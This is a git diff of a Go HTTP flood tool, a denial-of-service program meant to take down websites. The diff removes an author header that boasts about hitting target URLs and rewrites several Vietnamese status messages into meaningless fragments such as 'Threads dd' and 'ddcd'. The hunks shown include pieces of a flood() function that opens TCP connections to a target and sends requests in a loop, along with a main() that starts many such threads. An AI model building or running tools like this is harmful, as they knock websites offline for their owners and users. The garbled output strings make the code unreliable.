@@ -1,13 +1,3 @@
-/*
-Coded by Nickyz9400
-Please fking code ur script by ur self, kid.
-
-I changed the random integers range to the max of int32.
-Now 386 systems should work well.
-
-Looks like most people want to hit the url but not the host/ip.
-As a result, here you are.
-*/
 package main
 
 import (
@@ -197,7 +187,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("Ðang Ð?t WEBSITE By Nickyz9400!!!") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("By Nickyz9400!!!") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -268,11 +258,11 @@ func main() {
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
 		go flood() // Start threads
-		fmt.Printf("\rThreads [%.0f] Ðã s?n sàng", float64(i+1))
+		fmt.Printf("\rThreads dd", float64(i+1))
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
 	}
-	fmt.Printf("\nB?m [Enter] Ð? Ti?p T?c")
+	fmt.Printf("ddcd")
 	_, err = input.ReadString('\n')
 	if err != nil {
 		fmt.Println(err)
